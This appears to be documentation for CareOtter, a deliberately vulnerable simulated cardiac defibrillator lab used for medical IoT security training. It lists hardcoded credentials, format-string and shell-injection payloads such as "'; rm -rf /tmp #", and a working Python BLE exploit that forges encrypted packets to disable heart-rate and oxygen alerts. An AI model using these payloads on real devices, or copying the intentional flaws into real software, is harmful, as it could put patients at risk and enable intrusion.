# CareOtter — Lab Documentation

CareOtter is a simulated **ICD (Implantable Cardioverter-Defibrillator)** — an Implantable Cardioverter Defibrillator (ICD) cardiac device — running on Raspberry Pi 3B+ with OpenWRT. It emulates a modern cardiac rhythm management (CRM) implant used in clinical and remote-patient-monitoring scenarios. Like real ICDs, CareOtter exposes critical cardiac telemetry (heart rate and blood oxygenation) via BLE GATT for bedside or mobile clinician review, and streams the same data over HTTP to a hospital gateway. Device administration is performed through a legacy custom binary protocol (IGP v4) on TCP port 9999, and a Flask cloud API on the operator's machine acts as the HTTP-to-IGP bridge.

## Simulated Clinical Context

CareOtter is designed as a **generalist medical IoT security training scenario** representative of modern cardiac device ecosystems:

- **Device**: A next-generation DAI/ICD simulator with integrated pulse-oximetry telemetry (BPM / SpO₂).
- **Connectivity**: Dual-channel communication — **Bluetooth Low Energy (BLE)** for direct clinician/mobile app pairing, and **HTTP** for ward-to-cloud telemetry.
- **Administration**: A legacy **IGP v4** binary admin protocol used for device provisioning, threshold configuration, and network management.
- **Cloud/Gateway**: A Flask-based **Cloud API** that bridges external HTTP clients to the internal IGP admin service, mimicking hospital IT infrastructure and remote monitoring platforms.

This lab explores security across the full stack: **BLE pairing and GATT exposure**, **network communication**, **device administration protocols**, and **cloud API/data persistence**.

## Modern ICD Functions Emulated

Modern Implantable Cardioverter Defibrillators (ICDs) act as **intelligent control hubs** that monitor the heart 24/7 and deliver tiered therapies based on the severity of detected arrhythmias. CareOtter emulates the following core therapeutic and diagnostic functions:

- **Continuous cardiac monitoring** — real-time tracking of heart rate and rhythm to detect bradycardia, tachycardia, and fibrillation events.
- **Tiered electrical therapy** — delivery of progressively stronger interventions:
  - **Anti-tachycardia pacing (ATP)** — painless burst pacing to terminate fast but organized rhythms.
  - **Cardioversion** — a low-energy shock to restore normal rhythm during sustained ventricular tachycardia (VT).
  - **Defibrillation** — a high-energy shock to rescue the patient from ventricular fibrillation (VF).
- **SpO₂ alert forwarding** — when blood-oxygen saturation falls below **95 %**, the device is programmed to generate a **clinical alert to the attending physician**. The specific transport channel and destination endpoint for this alert are **still under definition** in the current firmware release.

### Security Relevance

Each of the above functions represents a **critical therapeutic capability** that can be abused if the device is compromised:

- **Illicit activation** — an attacker with administrative access could trigger unnecessary pacing shocks or high-energy defibrillation, causing patient harm and battery depletion.
- **Therapy suppression** — by tampering with threshold configurations or injecting imprecise BPM readings, an attacker could **silently disable or delay life-saving therapies** (e.g., raising VT detection zones so that a real arrhythmia is ignored).
- **Alert suppression / redirection** — manipulating the SpO₂ alert logic or blocking its transmission can prevent a physician from receiving early warning signs of hypoxemia.

Because CareOtter mirrors the control surface of a real cardiac implant, the lab demonstrates how **protocol-level vulnerabilities** (IGP v4 command injection, TLV parsing flaws, BLE exposure, and cloud API weaknesses) can cascade into **life-threatening therapeutic consequences**.

---

## Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                 RASPBERRY PI 3B+ — 192.168.2.1                   │
│                                                                  │
│  ┌────────────────────┐        ┌─────────────────────────────┐   │
│  │  MAX30102 Simulator│        │  careservice (C)            │   │
│  │  /opt/medical-     │        │  TCP :9999 — IGP v4         │   │
│  │  sensor/           │        │  12 admin commands          │   │
│  └────────┬───────────┘        └──────────────┬──────────────┘   │
│           │                                   │                  │
│  ┌────────▼───────────┐        ┌──────────────▼──────────────┐   │
│  │  sensor_service.py │        │  ble_server.py              │   │
│  │  HTTP :8081        │◄───────│  BlueZ D-Bus (dbus_fast)    │   │
│  │  6 endpoints       │        │  3 GATT services            │   │
│  └────────────────────┘        └─────────────────────────────┘   │
└──────────────────────────────────────────────────────────────────┘
        │ HTTP :8081                          │ BLE GATT
        ▼                                    ▼
┌──────────────────────────────┐   ┌──────────────────────┐
│  CLOUD API — operator PC     │   │  Mobile App          │
│  cloud_api/careotter/        │   │  (Android / Flutter) │
│  Flask :5002                 │   │  BLE direct connect  │
│  IGP v4 ← → HTTP REST        │   └──────────────────────┘
│  Web UI admin panel          │
└──────────────────────────────┘
```

---

## Device Services

### 1. Medical Sensor Service — HTTP :8081

Python service (`/opt/medical-sensor/sensor_service.py`) that reads from a MAX30102 simulator (or real hardware) and exposes vitals over HTTP.

| Method | Endpoint    | Auth | Description |
|--------|-------------|------|-------------|
| GET    | `/vitals`   | None | Current BPM, SpO2, raw ADC values, timestamp |
| GET    | `/health`   | None | Returns `ok` (plain text) |
| GET    | `/config`   | None | Active service configuration (sample rate, ports, log path) |
| GET    | `/log`      | None | Full in-memory vitals history buffer (circular, up to 1440 entries) |
| GET    | `/log/last` | None | Most recent vitals summary entry |
| GET    | `/reload`   | None | Forces log file reopen (alternative to SIGUSR1) |

**Example responses:**

```bash
$ curl http://192.168.2.1:8081/vitals
{"bpm": 78, "spo2": 98, "red_raw": 61085, "ir_raw": 61036, "timestamp": 1773738799.89, "source": "simulator"}

$ curl http://192.168.2.1:8081/config
{"use_real_hardware": false, "bpm": 72, "spo2": 98, "http_port": 8081,
 "log_file": "/tmp/medical-logs/vitals.log", "sample_rate": 10,
 "summary_every_s": 60, "log_buffer_max": 1440}

$ curl http://192.168.2.1:8081/log/last
{"bpm_avg": 78.0, "bpm_min": 72, "bpm_max": 84, "spo2_avg": 98.0,
 "spo2_min": 98, "spo2_max": 98, "samples": 600, "timestamp": 1773738765.06, "source": "simulator"}

$ curl http://192.168.2.1:8081/health
ok
```

---

### 2. Admin Service — IGP v4 TCP :9999

C daemon (`/opt/careotter/careservice`, source at `labs/careotter/careservice.c`) implementing the IoT Gateway Protocol v4 binary protocol.

#### IGP v4 Header Format

```
Bytes  0–3:  Magic  = 0x474F4154  ("GOAT"), big-endian uint32
Byte   4:    Cmd    = command code (uint8)
Byte   5:    Status = 0x00 (reserved)
Bytes  6–7:  Len    = payload length (big-endian uint16)
```

Total header: 8 bytes. Payload immediately follows. Server closes connection after sending response (EOF = delimiter).

#### Command Reference

| Cmd  | Name            | Auth | Payload              | Response             | Notes |
|------|-----------------|------|----------------------|----------------------|-------|
| 0x01 | SYS_INFO        | No   | —                    | `v:<kernel>\|m:<arch>` | Kernel release + machine arch |
| 0x02 | AUTHENTICATE    | No   | Token string         | `AUTH_SUCCESS` / `AUTH_FAIL` | **VULN: hardcoded token** |
| 0x03 | GET_NETWORK     | Yes  | —                    | Raw `/etc/config/wireless` | **VULN: exposes WiFi PSK** |
| 0x04 | SET_PREFS       | Yes  | TLV hex bytes        | `PREFS_SAVED` | **VULN: TLV integer underflow → BOF** |
| 0x05 | VERIFY_STATUS   | No   | Module name string   | Status diagnostic text | **VULN: format string** |
| 0x06 | SET_WIFI        | Yes  | `"SSID\|PSK"`        | `WIFI_UPDATED` / `WIFI_ERR` / `ERR_*` | **FLAW: shell injection via system()** |
| 0x07 | GET_VITALS      | No   | —                    | Full HTTP response from :8081/vitals | IGP→HTTP proxy |
| 0x08 | SET_THRESHOLD   | Yes  | TLV (0xBB + 0xCC)   | `THRESHOLD_SET` | Clean parser, writes to `/tmp/careotter.thresholds` |
| 0x09 | REBOOT_SERVICE  | Yes  | Service name string  | `SVC_RESTART_QUEUED` / `REBOOT_ERR` | **FLAW: no waitpid() → zombie processes** |
| 0x0A | GET_LOG         | Yes  | —                    | Last 512 bytes of `/tmp/careservice.log` | `LOG_EMPTY` if not present |
| 0x0B | DEFIBRILLATE    | Yes  | Any string           | `DEFIB_TRIGGERED:200J:<timestamp>` | **VULN: format string in event log**; simulates 200 J discharge |
| 0x0C | EMERGENCY_ALERT | Yes  | Alert message string | `ALERT_SENT:<msg>` | **FLAW: command injection via `curl` in `system()`**; reads endpoint from `/etc/careotter/alert.conf` |

#### TLV Formats

**SET_PREFS (0x04)** — vulnerable parser:
```
[Type(1)][Len(1)][Value(n)]...
  0xAA = visual theme name (e.g. "Dark")
  0xAB = language code (e.g. "es")
  0xAC = screen mode (0x00=day, 0x01=night)
```

**SET_THRESHOLD (0x08)** — clean parser:
```
BB 04 [bpm_min uint16 BE] [bpm_max uint16 BE]
CC 01 [spo2_min uint8]
```

#### Quick Test (Python)

```python
import socket, struct

MAGIC = 0x474F4154

def igp(cmd, payload=b''):
    hdr = struct.pack('>IBBH', MAGIC, cmd, 0, len(payload))
    with socket.create_connection(('192.168.2.1', 9999)) as s:
        s.sendall(hdr + payload)
        return s.recv(4096)

print(igp(0x01))                         # SYS_INFO
print(igp(0x02, b'OtterMobile2026'))      # AUTHENTICATE → AUTH_SUCCESS
print(igp(0x03))                         # GET_NETWORK (requires prior auth)
print(igp(0x05, b'%x.%x.%x'))           # Format string leak
print(igp(0x06, b"MySSID|mypassword123")) # SET_WIFI
# Threshold TLV: BPM 50–120, SpO2 min 90%
tlv = struct.pack('>BBHH', 0xBB, 4, 50, 120) + struct.pack('>BBB', 0xCC, 1, 90)
print(igp(0x08, tlv))                    # SET_THRESHOLD
```

---

### 3. BLE GATT Server

Python service (`/opt/medical-sensor/ble_server.py`) using `dbus_fast` over BlueZ D-Bus. Advertises as `CareOtter_HR`.

| GATT Service | UUID | Characteristic | UUID | Properties |
|---|---|---|---|---|
| Heart Rate | `0000180d-…` | HR Measurement | `00002a37-…` | notify, read |
| Pulse Oximeter | `00001822-…` | PLX Continuous | `00002a5f-…` | notify, read |
| Battery | `0000180f-…` | Battery Level | `00002a19-…` | read |
| Device Info | `0000180a-…` | Manufacturer Name | `00002a29-…` | read |
| Device Info | `0000180a-…` | Model Number | `00002a24-…` | read |
| **Alert/Config** | **`0000ff00-…`** | **Alert Threshold** | **`0000ff01-…`** | **read, write, notify** |

BLE reads vitals from the local sensor service at `http://127.0.0.1:8081/vitals` every notification cycle.

#### Protocolos Propietarios — CSCP v1

La característica `0xFF01` implementa el **CareOtter Secure Config Protocol v1 (CSCP v1)**, el mecanismo propietario del fabricante para proteger la configuración de umbrales clínicos durante la transmisión BLE. La documentación oficial describe este protocolo como "encriptación AES-128 de grado militar para garantizar la integridad de los datos médicos vitales".

**Estructura del paquete CSCP v1 (24 bytes, big-endian):**

| Offset | Tamaño | Campo   | Descripción |
|--------|--------|---------|-------------|
| `0x00` | 4      | Magic   | `0xCAFE0DDA` — identificador de protocolo |
| `0x04` | 4      | CRC32   | `binascii.crc32(ciphertext)` del bloque AES |
| `0x08` | 16     | Payload | Bloque AES-128-ECB cifrado |

**Contenido del bloque AES descifrado (16 bytes plaintext):**

| Offset | Tamaño | Campo    | Descripción |
|--------|--------|----------|-------------|
| `0x00` | 1      | bpm_min  | BPM mínimo de alerta (uint8) |
| `0x01` | 1      | bpm_max  | BPM máximo de alerta (uint8) |
| `0x02` | 1      | spo2_min | SpO₂ mínimo de alerta (uint8) |
| `0x03` | 13     | Padding  | `0x00` (relleno para completar bloque AES) |

**Parámetros criptográficos:**

| Parámetro | Valor |
|-----------|-------|
| Algoritmo | AES-128-ECB (Electronic Codebook, sin IV) |
| **Clave hardcoded** | **`careotter-key-16`** (16 bytes UTF-8) |
| Padding | Zero-padding (bytes `0x00`) |
| CRC | CRC32 estándar (`binascii.crc32` / `java.util.zip.CRC32`) |

> **Advertencia técnica**: AES-ECB sin IV con clave estática embebida en firmware y APK. La "seguridad" del protocolo depende exclusivamente de la ocultación de la clave (security through obscurity). Cualquier atacante que extraiga la clave puede forjar paquetes CSCP v1 válidos con umbrales letales y escribirlos directamente en `0xFF01` sin autenticación de sesión.

**Vulnerabilidades documentadas:**

- **M1 — Improper Credential Usage**: `CSCP_KEY = b"careotter-key-16"` visible en `ble_server.py` con `strings` o análisis de firmware. La misma clave está en `CareOtterConfig.java` del APK Android.
- **M3 — Insecure Authentication/Authorization**: No se requiere emparejamiento BLE para escribir en `0xFF01`. El protocolo CSCP v1 no autentica la sesión — solo serializa con un formato cifrado determinístico.
- **Sin validación de rangos**: El servidor acepta `bpm_min=0`, `bpm_max=255`, `spo2_min=0` sin lanzar error ni validar plausibilidad clínica.

**Exploit de referencia (Python/bleak):**

```python
import asyncio, struct, binascii
from bleak import BleakClient, BleakScanner
from Crypto.Cipher import AES

THRESHOLD_UUID = "0000ff01-0000-1000-8000-00805f9b34fb"
CSCP_KEY   = b"careotter-key-16"
CSCP_MAGIC = 0xCAFE0DDA

def forge_packet(bpm_min, bpm_max, spo2_min):
    pt = struct.pack("BBB", bpm_min, bpm_max, spo2_min) + b"\x00" * 13
    ct = AES.new(CSCP_KEY, AES.MODE_ECB).encrypt(pt)
    crc = binascii.crc32(ct) & 0xFFFFFFFF
    return struct.pack(">II", CSCP_MAGIC, crc) + ct

async def main():
    device = await BleakScanner.find_device_by_name("CareOtter_HR", timeout=10.0)
    async with BleakClient(device) as c:
        payload = forge_packet(0, 255, 0)   # suppress all alerts
        await c.write_gatt_char(THRESHOLD_UUID, payload)
        print("[+] CSCP v1 lethal thresholds written — alerts suppressed")

asyncio.run(main())
```

---

## Initialization Hooks

Hooks run in order at device startup from `/usr/lib/vulnzoo-hooks/profile-init.d/`:

| Hook | Description |
|------|-------------|
| `05-preflight.sh` | System pre-checks |
| `15-python-deps.sh` | Python dependency validation |
| `40-i2c.sh` | I2C bus initialization (MAX30102 interface) |
| `50-medical-sensor.sh` | Starts `medical-sensor` init.d service |
| `55-ble-server.sh` | Starts BLE GATT server |
| `60-cron.sh` | Cron setup |
| `70-careotter-admin.sh` | Starts `careservice` on TCP :9999 |
| `80-wifi.sh` | WiFi connectivity setup |

---

## Cloud API

Flask application at `cloud_api/careotter/api_server/` acting as HTTP-to-IGP bridge. Runs on port **5002** (`VULNERABLE=1`).

### Authentication

The Cloud API uses **SQLite-backed username/password authentication** with role-based access control. Two login endpoints are provided: one for administrators and one for patients. Both return a JWT (HS256, 8h expiry) and set a session cookie (`careotter_token`) for web browser access.

#### Admin Login

`POST /api/auth/login`

Requires `role=admin`. The default admin account is created automatically on first startup:

| Username | Password | Role |
|----------|----------|------|
| `admin` | `CareOtter2026!` | `admin` |

```bash
curl -X POST http://localhost:5002/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "CareOtter2026!"}'
# → {"token": "<JWT>", "expires_in": "8h", "type": "Bearer", "role": "admin"}
```

#### Patient Login

`POST /api/auth/login/patient`

Requires `role=patient`. A default patient account is also created on first startup:

| Username | Password | Role |
|----------|----------|------|
| `patient` | `patient123` | `patient` |

```bash
curl -X POST http://localhost:5002/api/auth/login/patient \
  -H "Content-Type: application/json" \
  -d '{"username": "patient", "password": "patient123"}'
# → {"token": "<JWT>", "expires_in": "8h", "type": "Bearer", "role": "patient"}
```

**Error codes (both endpoints):**

| HTTP | Code | Meaning |
|------|------|---------|
| `400` | `MISSING_FIELD` | Username or password not provided |
| `401` | `AUTH_FAIL` | Invalid username or password |
| `403` | `FORBIDDEN` | Role does not match endpoint requirement |
| `503` | `DB_ERROR` | SQLite database unavailable |

Protected API endpoints require `Authorization: Bearer <JWT>`. Web UI routes require the `careotter_token` cookie (set automatically on successful login).

### API Endpoints

| Method | Route | Auth | IGP Cmd | Description |
|--------|-------|------|---------|-------------|
| GET    | `/api/health`                 | No  | —     | API status, version, device address |
| POST   | `/api/auth/login`             | No  | —     | Admin login (username/password) → JWT |
| POST   | `/api/auth/login/patient`     | No  | —     | Patient login (username/password) → JWT |
| POST   | `/api/auth/logout`            | No  | —     | Clears session cookie |
| GET    | `/api/device/info`            | No  | 0x01  | Kernel version and architecture |
| GET    | `/api/device/status`          | No  | 0x05  | Subsystem diagnostic (`?module=CareOtter`) |
| GET    | `/api/vitals`                 | No  | HTTP  | Current BPM and SpO2 from sensor |
| GET    | `/api/vitals/history`         | No  | HTTP  | Vitals history buffer (up to 1440 entries) |
| GET    | `/api/network`                | JWT | 0x03  | Network configuration (raw includes WiFi PSK) |
| POST   | `/api/network/wifi`           | JWT | 0x06  | Configure WiFi `{"ssid": "...", "password": "..."}` |
| POST   | `/api/config/preferences`     | JWT | 0x04  | Set preferences `{"tlv_hex": "AA04..."}` |
| POST   | `/api/config/thresholds`      | JWT | 0x08  | Set alert thresholds `{"bpm_min": 50, "bpm_max": 120, "spo2_min": 90}` |
| POST   | `/api/services/restart`       | JWT | 0x09  | Restart init.d service `{"service": "medical-sensor"}` |
| GET    | `/api/logs`                   | JWT | 0x0A  | Last 512 bytes of device admin log |

**Services available for restart:** `medical-sensor`, `careservice`, `ble-server`

### Web UI

The Cloud API provides two separate web portals: an **Administration Panel** for technical personnel and a **Patient Portal** for end-user monitoring.

#### Administration Panel

Accessible at `http://localhost:5002/admin/login`. Requires `role=admin`.

| URL | Page | Access |
|-----|------|--------|
| `/admin/login` | Username/password login form | Public |
| `/admin/dashboard` | Live vitals + device info | Admin only |
| `/admin/network` | View/change WiFi configuration | Admin only |
| `/admin/config` | Clinical thresholds + TLV preferences | Admin only |
| `/admin/services` | Restart init.d services | Admin only |
| `/admin/logs` | Device log viewer + vitals history table | Admin only |

#### Patient Portal

Accessible at `http://localhost:5002/patient/login`. Requires `role=patient` (or `admin`).

| URL | Page | Access |
|-----|------|--------|
| `/patient/login` | Patient login form | Public |
| `/patient/dashboard` | Personal vitals monitor | Patient/Admin |
| `/` | Public vitals monitor (now requires login) | Patient/Admin |
| `/history` | SQLite vitals history with stats | Patient/Admin |

> **Security note:** All web UI routes (except the two login forms) now enforce session authentication via the `careotter_token` cookie. Unauthenticated requests are redirected to the appropriate login page.

### Docker Deployment

```bash
cd cloud_api/careotter
docker compose up careotter-api

# API:           http://localhost:5002/api/health
# Admin Panel:   http://localhost:5002/admin/login
# Patient Portal: http://localhost:5002/patient/login
```

---

## Vulnerability Map

| #   | Type                          | Location                                                                             | Trigger                                                                                                          |
| --- | ----------------------------- | ------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| 1   | Hardcoded credential          | `careservice.c` — `#define ADMIN_TOKEN "OtterMobile2026"`                            | `strings careservice` or IGP 0x02 brute-force                                                                    |
| 2   | Information disclosure        | `careservice.c` — cmd 0x03 GET_NETWORK                                               | POST-auth IGP 0x03 returns `/etc/config/wireless` with WiFi PSK in plaintext                                     |
| 3   | Integer underflow → stack BOF | `careservice.c` — `parse_preferences()`                                              | IGP 0x04 with TLV `Len=0xFF` and fewer real bytes; `remaining` underflows, `memcpy` overflows `local_store[128]` |
| 4   | Format string                 | `careservice.c` — `get_system_status()`, `snprintf(report_header, 128, module_name)` | IGP 0x05 payload `%x.%x.%x` leaks stack; `%n` writes                                                             |
| 5   | Shell injection (latent)      | `careservice.c` — cmd 0x06 SET_WIFI, `system(cmd)`                                   | IGP 0x06 with SSID `'; rm -rf /tmp #` — no shell metacharacter escaping                                          |
| 6   | Global auth state             | `careservice.c` — `int authenticated = 0` (global)                                   | Auth in one TCP connection persists for all subsequent connections to the same process                           |
| 7   | Weak JWT secret               | `config.py` — `JWT_SECRET = 'careotter_jwt_2026'`                                    | Brute-force HS256 with `hashcat` or `jwt_tool`                                                                   |
| 8   | WiFi PSK exposed via API      | `app.py` — GET `/api/network`, `raw` field in response                               | GET `/api/network` with valid JWT in `VULNERABLE=1` mode                                                         |
| 9   | Format string via API         | `app.py` — GET `/api/device/status?module=`                                          | `?module=%25x.%25x.%25x` passes format string to device when `VULNERABLE=1`                                      |
| 10  | Flask debug mode              | `app.py` — `app.run(debug=(vuln == 1))`                                              | Werkzeug interactive debugger active; RCE via PIN bypass                                                         |
| 11  | Format string (therapy log)   | `careservice.c` — cmd 0x0B DEFIBRILLATE, `snprintf(fmt_buf, sizeof(fmt_buf), payload)` | Payload `%x.%x.%x` leaks stack into `/tmp/careotter_events.log`; `%n` writes                                      |
| 12  | Command injection (alert)     | `careservice.c` — cmd 0x0C EMERGENCY_ALERT, `system(cmd)` with `curl … msg=%s`      | Payload `test'; reboot #` injects shell metacharacters through curl's `-d` parameter                              |

---

## Network Configuration

| Component | Address |
|-----------|---------|
| Raspberry Pi (OpenWRT) | `192.168.2.1` |
| IGP Admin Service | `192.168.2.1:9999` |
| Medical Sensor HTTP | `192.168.2.1:8081` |
| Cloud API (vulnerable) | `<operator-pc>:5002` |
| BLE | Advertised as `CareOtter_HR` |

## THINGS TO DO

This section tracks the remaining development work required to align the CareOtter lab implementation with its documented DAI/ICD scenario. Items are grouped by priority.

### ✅ Completed

1. **Synchronize IGP command reference in documentation**
   - Added `DEFIBRILLATE` (0x0B) and `EMERGENCY_ALERT` (0x0C) to the Command Reference table with payloads, responses, and vulnerability annotations.
   - Added vulnerabilities #11 (format string in therapy log) and #12 (command injection in alert dispatch) to the Vulnerability Map.
   - Updated architecture diagram from "10 admin commands" to "12 admin commands".

### 🔴 Critical — Blocking for lab coherence

2. **Decide and implement the SpO₂ < 95 % alert channel**
   - The documentation states that the DAI must generate a clinical alert to the attending physician when SpO₂ drops below 95 %.
   - **Currently no transport channel is implemented** in any component (sensor service, Cloud API, or mobile apps).
   - **Action:** Define the alert transport (options: HTTP POST from sensor to Cloud API, BLE notify to patient app with retransmission, or dedicated IGP command 0x0C as proxy). Implement the sender in `sensor_service.py` and the receiver/notification logic in the Cloud API dashboard.

3. **Unify clinical threshold persistence**
   - `careservice.c` command 0x08 (`SET_THRESHOLD`) writes to `/tmp/careotter.thresholds`.
   - `sensor_service.py` maintains its own in-memory `alert_thresholds` and never reads the file written by the admin service.
   - **Action:** Make the Python sensor service load thresholds from `/tmp/careotter.thresholds` on startup and reload it on SIGHUP/SIGUSR1 so that administrative changes take effect.

### 🟡 Medium — Functional improvement and realism

4. **Implement differentiated DAI therapies in `careservice.c`**
   - The "Modern ICD Functions" section describes three tiered therapies: ATP, Cardioversion, and Defibrillation.
   - The current binary only exposes a generic `DEFIBRILLATE` command (0x0B) with no energy levels or charge states.
   - **Action:** Extend the IGP protocol with sub-modes or energy-level parameters (e.g., ATP=1 J, Cardioversion=5 J, Defibrillation=20 J simulation) and return the simulated therapy applied. Alternatively, document explicitly that `DEFIBRILLATE` is a single placeholder command for the lab.

5. **Expose therapy commands through the Cloud API**
   - The Cloud API currently proxies administrative commands only. There are no HTTP endpoints to trigger or simulate therapies.
   - **Action:** Add protected REST endpoints (e.g., `POST /api/therapy/defibrillate`, `POST /api/therapy/emergency`) that forward to IGP 0x0B/0x0C, returning the device response. This allows the web admin panel to demonstrate therapy hijacking vulnerabilities.

6. **Add HTTP fallback to the patient Android app (`careotter_app`)**
   - The patient app is BLE-only. If the Bluetooth adapter is absent or out of range, the app cannot display vitals.
   - **Action:** Implement an HTTP client in `MainActivity` that polls `http://192.168.2.1:8081/vitals` (or the Cloud API) when BLE is unavailable, with a manual toggle or automatic fallback.

7. **Integrate Cloud API into the admin Android app (`careotter_admin`)**
   - The admin app connects directly via raw TCP to `:9999`. It does not use JWT, HTTP, or the Cloud API at all.
   - **Action:** Add an HTTP/JWT client layer so the admin app can authenticate against the Cloud API (`:5002`) and perform administrative operations remotely, mirroring real-world hospital IT workflows.

### 🟢 Low — Polish and documentation

8. **Create missing `CONTEXT.md` for `careotter_admin`**
   - `vulnzoo_apps/careotter_admin/` lacks a `CONTEXT.md` stage contract, unlike `careotter_app`.
   - **Action:** Write the stage contract documenting inputs, process, outputs, and the intended vulnerability surface of the admin app.

9. **Update `labs/careotter/CONTEXT.md` to DAI/ICD framing**
   - The file still describes the device as a "pulse oximeter device simulator" rather than a DAI/ICD.
   - **Action:** Rewrite the scenario and architecture sections to match the cardiac-device narrative, and update the command reference to 12 commands.

10. **Create an OpenWRT init script for the BLE server**
    - `ble_server.py` is started directly by hook `55-ble-server.sh`. There is no `/etc/init.d/ble-server` procd script.
    - **Action:** Create a standard procd init script for `ble-server` consistent with `medical-sensor` and `careservice`, including `start`, `stop`, `restart`, and health-check semantics.

11. **Add rate limiting and TLS documentation to the Cloud API**
    - The Flask API has no request throttling and serves over plain HTTP.
    - **Action:** Add `flask-limiter` for basic rate limiting on authentication endpoints, and document that production deployments must place the container behind an HTTPS reverse proxy.

12. **Wire up unused database service methods**
    - `database_service.py` implements `log_event()` and `cleanup_old_data()`, but neither is invoked from `app.py`.
    - **Action:** Call `log_event()` when critical device events occur (e.g., threshold changes, service restarts) and schedule `cleanup_old_data()` on application startup or via a periodic endpoint.

13. **Design and implement an OTA firmware update vulnerability**
    - Real cardiac implants support over-the-air firmware updates via BLE or the clinic's wand programmer. A compromised OTA mechanism is a high-impact attack vector that can alter therapy algorithms, disable safety interlocks, or implant persistent malware.
    - **Action:** Define an OTA update flow for CareOtter (e.g., signed/unsigned firmware packages, BLE DFU, or IGP-based image transfer). Introduce at least one intentional vulnerability in the verification or installation stage (examples: missing signature validation, downgrade attack, plaintext firmware image, insecure temporary storage, or race condition during flash write). Document the attack chain and add the corresponding endpoint/command to the Cloud API or IGP protocol.

